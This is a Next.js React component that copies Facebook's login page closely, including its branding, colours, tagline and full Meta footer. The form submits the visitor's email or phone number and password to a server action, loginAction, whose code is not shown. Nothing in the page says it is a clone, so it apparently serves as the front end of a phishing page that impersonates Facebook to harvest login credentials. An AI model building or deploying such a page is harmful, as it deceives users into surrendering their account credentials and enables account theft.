import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Separator } from "@/components/ui/separator";
import Link from "next/link";
import { loginAction } from "@/app/actions";

export default function LoginPage() {
  return (
    <div className="flex min-h-screen flex-col items-center bg-[#F0F2F5] font-sans text-[#1c1e21]">
      <div className="flex-grow flex items-center justify-center w-full px-4 pt-[20px] md:pt-[72px] lg:pt-[92px]">
        <div className="grid lg:grid-cols-2 items-center gap-12 lg:gap-24 max-w-[980px] w-full mx-auto pb-12 lg:pb-24">
          <div className="text-center lg:text-left">
            <h1 className="text-[#1877f2] text-5xl md:text-6xl font-bold -ml-[4px] tracking-tighter">facebook</h1>
            <p className="text-[24px] md:text-[28px] mt-2 leading-tight text-[#1c1e21] max-w-[500px] mx-auto lg:mx-0 font-normal">
              Facebook helps you connect and share with the people in your life.
            </p>
          </div>
          <div className="w-full max-w-[396px] mx-auto">
            <Card className="shadow-[0_2px_4px_rgba(0,0,0,0.1),0_8px_16px_rgba(0,0,0,0.1)] border-none rounded-lg overflow-hidden bg-white">
              <CardContent className="p-4 pt-4">
                <form action={loginAction} className="space-y-3">
                  <div className="space-y-2">
                    <Input
                      id="email"
                      name="email"
                      type="text"
                      placeholder="Email address or phone number"
                      className="h-[52px] text-[17px] border-[#dddfe2] focus-visible:ring-1 focus-visible:ring-[#1877f2] focus-visible:border-[#1877f2] rounded-md px-4 py-3"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Input
                      id="password"
                      name="password"
                      type="password"
                      placeholder="Password"
                      className="h-[52px] text-[17px] border-[#dddfe2] focus-visible:ring-1 focus-visible:ring-[#1877f2] focus-visible:border-[#1877f2] rounded-md px-4 py-3"
                      required
                    />
                  </div>
                  <Button type="submit" className="w-full h-12 text-[20px] font-bold bg-[#1877f2] hover:bg-[#166fe5] rounded-md py-2">
                    Log In
                  </Button>
                </form>
                <div className="mt-4 text-center">
                  <Link
                    href="#"
                    className="text-[14px] text-[#1877f2] hover:underline"
                  >
                    Forgotten password?
                  </Link>
                </div>
                <Separator className="my-5 bg-[#dadde1]" />
                <div className="text-center pb-2">
                  <Button className="bg-[#42b72a] text-white hover:bg-[#36a420] h-12 px-4 font-bold text-[17px] border-none rounded-md">
                    Create new account
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
      <footer className="w-full bg-white pt-8 pb-12 mt-auto">
        <div className="max-w-[980px] mx-auto px-4">
          <div className="flex flex-wrap text-[12px] text-[#8a8d91] gap-x-3 gap-y-1">
            <span className="text-[#737373]">English (US)</span>
            <Link href="#" className="hover:underline">Română</Link>
            <Link href="#" className="hover:underline">Magyar</Link>
            <Link href="#" className="hover:underline">Italiano</Link>
            <Link href="#" className="hover:underline">Español (España)</Link>
            <Link href="#" className="hover:underline">Français (France)</Link>
            <Link href="#" className="hover:underline">Deutsch</Link>
            <Link href="#" className="hover:underline">Türkçe</Link>
            <Link href="#" className="hover:underline">Português (Brasil)</Link>
            <Link href="#" className="hover:underline">العربية</Link>
            <Link href="#" className="hover:underline">हिन्दी</Link>
            <button className="bg-[#f5f6f7] border border-[#ccd0d5] px-2 leading-tight rounded-sm font-bold text-[#4b4f56] hover:bg-[#ebedf0]">+</button>
          </div>
          <Separator className="my-2 bg-[#dddfe2]" />
          <div className="flex flex-wrap text-[12px] text-[#8a8d91] gap-x-5 gap-y-1">
            <Link href="#" className="hover:underline">Sign Up</Link>
            <Link href="#" className="hover:underline">Log In</Link>
            <Link href="#" className="hover:underline">Messenger</Link>
            <Link href="#" className="hover:underline">Facebook Lite</Link>
            <Link href="#" className="hover:underline">Video</Link>
            <Link href="#" className="hover:underline">Places</Link>
            <Link href="#" className="hover:underline">Games</Link>
            <Link href="#" className="hover:underline">Marketplace</Link>
            <Link href="#" className="hover:underline">Meta Pay</Link>
            <Link href="#" className="hover:underline">Meta Store</Link>
            <Link href="#" className="hover:underline">Meta Quest</Link>
            <Link href="#" className="hover:underline">Ray-Ban Meta</Link>
            <Link href="#" className="hover:underline">Meta AI</Link>
            <Link href="#" className="hover:underline">Instagram</Link>
            <Link href="#" className="hover:underline">Threads</Link>
            <Link href="#" className="hover:underline">Fundraisers</Link>
            <Link href="#" className="hover:underline">Services</Link>
            <Link href="#" className="hover:underline">Voting Information Centre</Link>
            <Link href="#" className="hover:underline">Privacy Policy</Link>
            <Link href="#" className="hover:underline">Privacy Centre</Link>
            <Link href="#" className="hover:underline">Groups</Link>
            <Link href="#" className="hover:underline">About</Link>
            <Link href="#" className="hover:underline">Create ad</Link>
            <Link href="#" className="hover:underline">Create Page</Link>
            <Link href="#" className="hover:underline">Developers</Link>
            <Link href="#" className="hover:underline">Careers</Link>
            <Link href="#" className="hover:underline">Cookies</Link>
            <Link href="#" className="hover:underline">AdChoices</Link>
            <Link href="#" className="hover:underline">Terms</Link>
            <Link href="#" className="hover:underline">Help</Link>
            <Link href="#" className="hover:underline">Contact uploading and non-users</Link>
            <Link href="#" className="hover:underline">Settings</Link>
            <Link href="#" className="hover:underline">Activity log</Link>
          </div>
          <div className="mt-5 text-[11px] text-[#737373]">
            Meta © 2025
          </div>
        </div>
      </footer>
    </div>
  );
}